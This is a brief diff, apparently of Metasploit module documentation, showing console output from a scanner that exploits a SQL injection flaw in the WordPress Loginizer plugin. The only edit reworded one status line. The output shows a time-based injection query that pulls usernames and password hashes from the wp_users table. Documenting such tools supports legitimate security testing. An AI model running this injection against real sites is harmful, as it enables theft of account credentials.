@@ -60,7 +60,7 @@ msf6 auxiliary(scanner/http/wp_loginizer_log_sqli) > run
 
 [*] Checking /wp-content/plugins/loginizer/readme.txt
 [*] Found version 1.6.3 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Loginizer detected
 [*] {SQLi} Executing (select group_concat(XMjgCKOLn) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) XMjgCKOLn from wp_users limit 3) ZtmrJNCuJ)
 [*] {SQLi} Time-based injection: expecting output of length 124
 [+] wp_users
